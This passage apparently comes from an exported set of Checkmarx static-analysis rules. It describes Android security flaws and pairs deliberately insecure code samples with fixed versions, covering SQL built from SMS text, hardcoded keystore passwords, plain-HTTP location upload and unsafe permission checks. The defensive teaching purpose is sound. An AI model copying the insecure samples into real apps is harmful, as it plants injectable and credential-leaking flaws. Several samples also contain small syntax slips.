&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4691</key><name>WebView_Cache_Information_Leak</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Webview cache folder inside the application may be a source of information leaks.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;The cache folder may store sensitve information that may leak&amp;nbsp;information such as pictures, browsed&amp;nbsp;sites and more resources.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Resources are stored in application's local cache diretory in order to improve performance&amp;nbsp;and experience for users.&lt;/p&gt;
&lt;p&gt;Form data such as user, password and email are also stored by default when using WebViews.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;It is highly recommended to clear the cache is the application accesses any sensitive data.&lt;/p&gt;
&lt;p&gt;Server side headrs such as no-cache can be used to indicate that an application should not cache particular resource.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Disable the cache&lt;/h4&gt;&lt;pre&gt;1. Set the “no-cache” in the headers by using the below code snippet:

	HashMap&lt;String,String&gt; noCacheHeaders = new HashMap&lt;String, String&gt;(2);
	        noCacheHeaders.put("Pragma", "no-cache");
	        noCacheHeaders.put("Cache-Control", "no-cache");
	                  WebView webView = (WebView) findViewById(R.id.webview);
	        webView.setWebViewClient(new MyBrowser(), noCacheHeaders);
	                  webView.loadUrl("https://example.com/");


	                  private class MyBrowser extends WebViewClient {
	     @Override
	        public boolean shouldOverrideUrlLoading(WebView view, String url) {
	         /* check for the url */
	    if (Uri.parse(url).getHost().equals("www.example.com")){
	                return false;
	         }
	    else{
	    return true;
	    }
	 }


2. In the WebViews settings, set the appCache false by using below code snippet:

	WebView webView = (WebView) findViewById(R.id.webview);
	webView.getSettings().setAppCacheEnabled(false);
	webView.getSettings().setAppCacheMaxSize(1);
	webView.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);&lt;/pre&gt;&lt;h4&gt;Clear the cache: The cache can be cleared at multiple stages in the application&lt;/h4&gt;&lt;pre&gt;ebView.clearCache(true);

The cache can be cleared :
	1. just before loading the webpage :

	    webView.clearCache(true);
	    webView.loadUrl("https://example.com/");


	2. After loading of webpage:

	    private class MyBrowser extends WebViewClient {
	            @Override
	            public boolean shouldOverrideUrlLoading(WebView view, String url) {
	                /* check for the url */
	                return false;

	            }

	            @Override
	            public void onPageFinished(WebView view, String url){

	    super.onPageFinished(view, url);
	    view.clearCache(true);

	            }
	        }&lt;/pre&gt;&lt;h4&gt;The form data such as userId , password, email-Id is saved by default when using webviews. The default behaviour can be overridden&lt;/h4&gt;&lt;pre&gt;WebView webView = (WebView) findViewById(R.id.webview);
webView.getSettings().setSaveFormData(false);
webView.getSettings().setSavePassword(false); // Not needed for API level 18 or greater (deprecated)


In cases, where there is need to save form data but needs to be cleared at some point, such as on restart of application, the below code snippet can be used:

WebView webView = (WebView) findViewById(R.id.webview);
webView.loadUrl(“https://www.domain.com/”)
webView.clearFormData();&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1593</key><name>Client_Side_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;A remote attacker could access all of the app's data indirectly, by poisoning various methods of data input sent to the app (e.g. by sending an SMS or editing text fields). This could include&amp;nbsp;stealing any sensitive information stored by the app, such as personal user details or credit cards, and possibly even change or erase existing data.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The app communicates with its local storage by calling methods on the storage classes, e.g.&amp;nbsp;&lt;code&gt;SqLiteDataBase.query()&lt;/code&gt;, and passing selection variables to these methods. These classes internally create a&amp;nbsp;textual SQL query, including the parameters that were passed in.&amp;nbsp;Since these variables are based on untrusted input, and are&amp;nbsp;neither checked for data validity nor sanitized, the input could contain SQL commands that would be interpreted as such by the database.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Generic Guidance&lt;/p&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;In particular, all data validation should be performed after canonicalization, i.e. after the data has been decoded and simplified.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Do not concatenate untrusted input into the SQL query, instead only use parameterized queries and object bindings. &amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Recommendations&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Perform input sanitization after the decoding.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Do not&amp;nbsp;send input (even indirectly) to injectable parameters, such as &lt;code&gt;whereClause&lt;/code&gt; and &lt;code&gt;selection&lt;/code&gt;; instead, use parameterized queries and submit the input to the database methods via the designated parameters, e.g. &lt;code&gt;whereArgs&lt;/code&gt; and &lt;code&gt;selectionArgs&lt;/code&gt;.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;&amp;nbsp;&lt;/div&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Log SMS Directly to Database&lt;/h4&gt;&lt;pre&gt;public void logSmsMessageToDatabase(SmsMessage sms) {
	String message = sms.getDisplayMessageBody();
  	long timestamp = sms.getTimestampMillis(); 

  	SQLiteDatabase db = SQLiteDatabase.openDatabase(DB_PATH, null, OPEN_READWRITE);

  	String sql = "insert into Messages values(" + new Date(timestamp) + ", '" + message "')";
  	db.execSQL(sql); 
}&lt;/pre&gt;&lt;h4&gt;Log SMS Securely&lt;/h4&gt;&lt;pre&gt;public void logSmsMessageToDatabase(SmsMessage sms) {
	String message = sms.getDisplayMessageBody();
  	long timestamp = sms.getTimestampMillis(); 

  	try { 
  		SQLiteDatabase db = SQLiteDatabase.openDatabase(DB_PATH, null, OPEN_READWRITE);

      	ContentValues values = new ContentValues();
    	values.put(MessageStorage.COLUMN_TIMESTAMP, new Date(timestamp));
      	values.put(MessageStorage.COLUMN_MESSAGEBODY, message); 

		db.insertOrThrow("Messages", null, values);

    } catch (SQLException ex) {
		handleErrors(ex);
    }
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4710</key><name>Hardcoded_Password_In_Gradle</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div style="box-sizing: border-box; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 18px;"&gt;Hardcoded passwords expose the application to password leakage. If an attacker gains access to the source code, she will be able to steal the embedded passwords, and use them to impersonate a valid user. This could include impersonating end users to the application, or impersonating the application to a remote system, such as a database or a remote web service.&amp;nbsp;&lt;/div&gt;
&lt;div style="box-sizing: border-box; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 18px;"&gt;Once the attacker succeeds in impersonating the user or application, she will have full access to the system, and be able to do anything the impersonated identity could do.&amp;nbsp;&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div style="box-sizing: border-box; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 18px;"&gt;The application codebase&amp;nbsp;has string literal passwords embedded in the source code. This hardcoded value is used either to compare to user-provided credentials, or to authenticate downstream to a remote system (such as a database or a remote web service). &amp;nbsp;&lt;/div&gt;
&lt;div style="box-sizing: border-box; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 18px;"&gt;An attacker only needs to gain access to the source code to reveal the hardcoded password. Likewise, the attacker can reverse engineer the compiled application binaries, and easily retrieve the embedded password. Once found, the attacker can easily use the password in impersonation attacks, either directly on the application or to the remote system.&amp;nbsp;&lt;/div&gt;
&lt;div style="box-sizing: border-box; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 18px;"&gt;Furthermore, once stolen, this password cannot be easily changed to prevent further misuse, unless a new version of the application is compiled. Moreover, if this application is distributed to numerous systems, stealing the password from one system automatically allows a class break in to all the deployed systems.&amp;nbsp;&lt;/div&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul style="box-sizing: border-box; margin-top: 0px; margin-bottom: 10px; color: rgba(0, 0, 0, 0.870588); font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 18px;"&gt;
&lt;li style="box-sizing: border-box;"&gt;Do not hardcode any secret data in source code, especially not passwords.&amp;nbsp;&lt;/li&gt;
&lt;li style="box-sizing: border-box;"&gt;Do not hardcode secret data, passwords and tokens in build.gradle&lt;/li&gt;
&lt;li style="box-sizing: border-box;"&gt;Use variables in build.gradle file linked to a local.properties file&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Hardcoded Credentials&lt;/h4&gt;&lt;pre&gt;signingConfigs {
	release {
		storeFile file("myapp.keystore")
		storePassword "password123"
		keyAlias "keyAlias"
		keyPassword "password789"
	}
}&lt;/pre&gt;&lt;h4&gt;Variables in build.gradle linked to local.properties&lt;/h4&gt;&lt;pre&gt;local.properties
=============================
KEYSTORE_PASSWORD=password123
KEY_PASSWORD=password789
=============================

build.gradle
==========================================================
try {
	storeFile file("myapp.keystore")
	storePassword KEYSTORE_PASSWORD
	keyAlias "keyAlias"
	keyPassword KEY_PASSWORD

} catch (ex) {
	throw new InvalidUserDataException(“…”)
}
==========================================================&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4711</key><name>ProGuard_Obfuscation_Not_In_Use</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;All android applications are possible to reverse engineer, which will allow users to see the source code of the program.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Obfuscating the code will&amp;nbsp;change the names and make not make them meaningful, therefore make much harder to read the source code and steal intelectual property (IP).&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;It is recommended to use ProGuard in order to obfuscate the source code:&lt;/p&gt;
&lt;p&gt;1. Make it harder to read the source code and IP.&lt;/p&gt;
&lt;p&gt;2. Shrinks the size of the application and increases average performance.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Code Obfuscated By ProGuard&lt;/h4&gt;&lt;pre&gt;release {
  
  minifyEnabled true
  proguardFiles getDefaultProguardFile('proguard-android.txt'), ‘proguard-rules.txt'
  signingConfig signingConfigs.release
    
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1597</key><name>Insufficient_Sensitive_Transport_Layer</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Sending data over the network is inherently risky, unless the communication channel is protected using a secured protocol. This is&amp;nbsp;especially true for mobile devices that are often connected to non-secure networks and&amp;nbsp;untrusted hotspots. An attacker can easily eavesdrop on the information&amp;nbsp;being sent over the air, and even manipulate the data in some scenarios.&lt;/p&gt;
&lt;p&gt;Thus, an attacker could steal any personal or secret data sent over unencrypted HTTP, such as passwords, credit card details, social security numbers, and other forms of PII (Personally Identifiable Information), leading to identity theft and other forms of fraud. Additionally, it may be possible for an active attacker to alter the data and inject false or malicious data, causing further damage to the application server or the client app.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The app handles various forms of sensitive data, and communicates with the remote application server. However,&amp;nbsp;the app connects using an "&lt;code&gt;http://&lt;/code&gt;" URL, which will cause the underlying channel to use straight HTTP, without securing it with SSL/TLS.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Always use secure protocol by connecting to "&lt;code&gt;https://&lt;/code&gt;" URLs. Never send sensitive data to an "&lt;code&gt;http://&lt;/code&gt;" URL.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Sending Current Location over Exposed HTTP&lt;/h4&gt;&lt;pre&gt;private void sendLocation(Location currentLocation) {
	HttpClient client = new DefaultHttpClient();

  	HttpPost request = new HttpPost("http://my.server.io/app/submitLocation");
  	List&lt;NameValuePair&gt; params = new ArrayList&lt;NameValuePair&gt;();
  	params.add(new BasicNameValuePair("id", this.UserID));
  	params.add(new BasicNameValuePair("latitude", Double.toString(currentLocation.getLatitude()));
  	params.add(new BasicNameValuePair("longitude", Double.toString(currentLocation.getLongitude()));
  	request.setEntity(new UrlEncodedFormEntity(params));
  
  	client.execute(request);
}&lt;/pre&gt;&lt;h4&gt;Securing Location Data with HTTPS&lt;/h4&gt;&lt;pre&gt;private void sendLocation(Location currentLocation) {
  	HttpClient client = new DefaultHttpClient();
	
  	// Set URI to "https://..." to use SSL/TLS
  	HttpPost request = new HttpPost("https://my.server.io/app/submitLocation");

  	try { 
        List&lt;NameValuePair&gt; params = new ArrayList&lt;NameValuePair&gt;();
        params.add(new BasicNameValuePair("id", this.UserID));
        params.add(new BasicNameValuePair("latitude", Double.toString(currentLocation.getLatitude()));
        params.add(new BasicNameValuePair("longitude", Double.toString(currentLocation.getLongitude()));
        request.setEntity(new UrlEncodedFormEntity(params));
	
  		client.execute(request);
    } catch (ClientProtocolException ex) {
		handleErrors(ex);
    } catch (IOException ex) {
      	handleErrors(ex);
    }
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>CRITICAL</severity><tag>checkmarx-high</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1598</key><name>Insufficient_Transport_Layer_Protect</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Sending data over the network is inherently risky, unless the communication channel is protected using a secured protocol. This is&amp;nbsp;especially true for mobile devices that are often connected to non-secure networks and&amp;nbsp;untrusted hotspots. An attacker can easily eavesdrop on the information&amp;nbsp;being sent over the air, and even manipulate the data in some scenarios.&lt;/p&gt;
&lt;p&gt;Thus, an attacker could steal any personal or secret data sent over unencrypted HTTP, such as passwords, credit card details, social security numbers, and other forms of PII (Personally Identifiable Information), leading to identity theft and other forms of fraud. Additionally, it may be possible for an active attacker to alter the data and inject false or malicious data, causing further damage to the application server or the client app.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The app handles various forms of sensitive data, and communicates with the remote application server. However,&amp;nbsp;the app connects using an "&lt;code&gt;http://&lt;/code&gt;" URL, which will cause the underlying channel to use straight HTTP, without securing it with SSL/TLS.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Always use secure protocol by connecting to "&lt;code&gt;https://&lt;/code&gt;" URLs. Never send sensitive data to an "&lt;code&gt;http://&lt;/code&gt;" URL.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Sending Current Location over Exposed HTTP&lt;/h4&gt;&lt;pre&gt;private void sendLocation(Location currentLocation) {
	HttpClient client = new DefaultHttpClient();

  	HttpPost request = new HttpPost("http://my.server.io/app/submitLocation");
  	List&lt;NameValuePair&gt; params = new ArrayList&lt;NameValuePair&gt;();
  	params.add(new BasicNameValuePair("id", this.UserID));
  	params.add(new BasicNameValuePair("latitude", Double.toString(currentLocation.getLatitude()));
  	params.add(new BasicNameValuePair("longitude", Double.toString(currentLocation.getLongitude()));
  	request.setEntity(new UrlEncodedFormEntity(params));
  
  	client.execute(request);
}&lt;/pre&gt;&lt;h4&gt;Securing Location Data with HTTPS&lt;/h4&gt;&lt;pre&gt;private void sendLocation(Location currentLocation) {
  	HttpClient client = new DefaultHttpClient();
	
  	// Set URI to "https://..." to use SSL/TLS
  	HttpPost request = new HttpPost("https://my.server.io/app/submitLocation");

  	try { 
        List&lt;NameValuePair&gt; params = new ArrayList&lt;NameValuePair&gt;();
        params.add(new BasicNameValuePair("id", this.UserID));
        params.add(new BasicNameValuePair("latitude", Double.toString(currentLocation.getLatitude()));
        params.add(new BasicNameValuePair("longitude", Double.toString(currentLocation.getLongitude()));
        request.setEntity(new UrlEncodedFormEntity(params));
	
  		client.execute(request);
    } catch (ClientProtocolException ex) {
		handleErrors(ex);
    } catch (IOException ex) {
      	handleErrors(ex);
    }
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4721</key><name>Keyboard_Cache_Information_Leak</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The suggestions dictionary, derived from user keyboard inputs, is globally accessible to other applications on the device. If sensitive information is cached within this dictionary, it can be stolen&amp;nbsp;by an untrusted application.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The suggestion dictionary, often referred to as auto-complete, is built upon a preset dictionary as well as user inputs. This dictionary is available to applications on the device to provide users with ease-of-use for commonly typed words or phrases. However, failure to restrict sensitive&amp;nbsp;text fields will cause their contents to be joined into this dictionary as well, exposing them to potentially untrusted applications that co-inhabit the device.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Configure text field whose contents are sensitive to explicitly not be cached into the suggestions dictionary.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Field "answer_security_question" Will Be Cached Into Dictionary&lt;/h4&gt;&lt;pre&gt;&lt;EditText
      android:id="@+id/answer_security_question"
      android:layout_width="fill_parent"
      android:layout_height="wrap_content"
      android:text="@string/enter_text"
      android:inputType="text"
/&gt;&lt;/pre&gt;&lt;h4&gt;Field "answer_security_question" Will Not Be Cached Into Dictionary&lt;/h4&gt;&lt;pre&gt;&lt;EditText
      android:id="@+id/answer_security_question"
      android:layout_width="fill_parent"
      android:layout_height="wrap_content"
      android:text="@string/enter_text"
      android:inputType="textNoSuggestions|textVisiblePassword"
/&gt;&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4724</key><name>No_Installer_Verification_Implemented</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Tampering the source code may allow malicious users to re-write the source code and use steal users' data, credentials, credit card etc. without any suspicion.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Lack of tampering detection will allow attackers to change the source code to do whatever they want, while no suspicions is arised from the developers.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;It is highly recommended to use tampering detection in order to prevent a release of a tampered application.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Check if the installer is Google Play&lt;/h4&gt;&lt;pre&gt;context.getPackageManager()
.getInstallerPackageName(context.getPackageName())
.startsWith("com.android.vending")&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4725</key><name>Unsafe_Permission_Check</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;&lt;span id="docs-internal-guid-7e5132c0-9d5a-0a47-d565-abec6fc08a0c"&gt;&lt;span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"&gt;Malicious software could access certain resources or the URI without the required permission.&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p dir="ltr" style="line-height: 1.7142866666666667; margin-top: 0pt; margin-bottom: 16pt; text-align: justify;"&gt;&lt;span style="font-family: Arial; color: #000000; background-color: #ffffff; font-weight: 400; font-style: normal; font-variant: normal; text-decoration: none; vertical-align: baseline; white-space: pre-wrap;"&gt;An insecure method of runtime permission check when accessing resources or URI in the context of inter-process communication (IPC) is called.&lt;/span&gt;&lt;/p&gt;
&lt;p dir="ltr" style="line-height: 1.7142866666666667; margin-top: 0pt; margin-bottom: 16pt; text-align: justify;"&gt;&lt;span style="font-family: Arial; color: #000000; background-color: #ffffff; font-weight: 400; font-style: normal; font-variant: normal; text-decoration: none; vertical-align: baseline; white-space: pre-wrap;"&gt;The checkCallingOrSelfPermission() and checkCallingOrSelfUriPermission() methods return PERMISSION_GRANTED if either the caller or the called application has the required permission. Improper use of these methods can lead to privilege escalation (confused deputy attack). Malicious applications can use the features of these methods and, in case of their misuse, access certain resources or the URI without the required permission, if the vulnerable application that provides an interface to its resources through IPC has the required permission.&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;&lt;span id="docs-internal-guid-7e5132c0-9d5b-d696-6e64-179c8f69f448"&gt;&lt;span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"&gt;For safe permission checks in the interprocess communication use checkCallingPermission() and checkCallingUriPermission() methods.&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Bad  - In the following example, the insecure checkCallingOrSelfPermission() function is used&lt;/h4&gt;&lt;pre&gt;int res = getContext().checkCallingOrSelfPermission("android.permission.RECEIVE_SMS");
return (res == PackageManager.PERMISSION_GRANTED);&lt;/pre&gt;&lt;h4&gt;Good - In this case, checkCallingPermission() should be used instead&lt;/h4&gt;&lt;pre&gt;int res = getContext().checkCallingPermission("android.permission.RECEIVE_SMS");
return (res == PackageManager.PERMISSION_GRANTED);&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4734</key><name>Copy_Paste_Buffer_Caching</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Mobile users tend to copy and paste&amp;nbsp;usually due to space limitation on the mobile screen. If&amp;nbsp;a user copies sensitive information such as passowrds, credit cards etc. to the clipboard, then an attacker will be able to read it with a 3rd party application running on the device&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;The clipboard is a public domain that every application can access and read its content. Therefore, everything that is&amp;nbsp;copied to the clipboard in a way vulnurable and possible to be stolen by an attacker if a malicious application is installed on the device.&amp;nbsp;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Text fields containing sensitive information should not be stored in clipboard.&lt;/p&gt;
&lt;p&gt;1. EditText field with inputType textPassword is considered to be a safe input.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;2. Regular EditText fields -&amp;nbsp;The cursor handling should be disabled.&lt;/p&gt;
&lt;p&gt;3. Define&amp;nbsp;custom selection callbacks that prevents the action mode (Select All, Cut, Copy, Paste) from being started&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;EditText inputType="textPassword"&lt;/h4&gt;&lt;pre&gt;&lt;EditText
    android:id="@+id/password"
    android:hint="@string/password_hint"
    android:inputType="textPassword"
    ... /&gt;&lt;/pre&gt;&lt;h4&gt;Disabling the cursor handling, making the options unavailable&lt;/h4&gt;&lt;pre&gt;@Override
public boolean onTouchEvent(MotionEvent event) {
    if (event.getActionMasked() == MotionEvent.ACTION_UP &amp;&amp; mDisableCursorHandle) {
        cancelLongPress();
    }
    return super.onTouchEvent(event);
}&lt;/pre&gt;&lt;h4&gt;Custom selection callbacks that prevent action mode from being started&lt;/h4&gt;&lt;pre&gt;edittext.setCustomSelectionActionModeCallback(new ActionMode.Callback() {

            public boolean onPrepareActionMode(ActionMode mode, Menu menu) {
                return false;
            }

            public void onDestroyActionMode(ActionMode mode) {                  
            }

            public boolean onCreateActionMode(ActionMode mode, Menu menu) {
                return false;
            }

            public boolean onActionItemClicked(ActionMode mode, MenuItem item) {
                return false;
            }
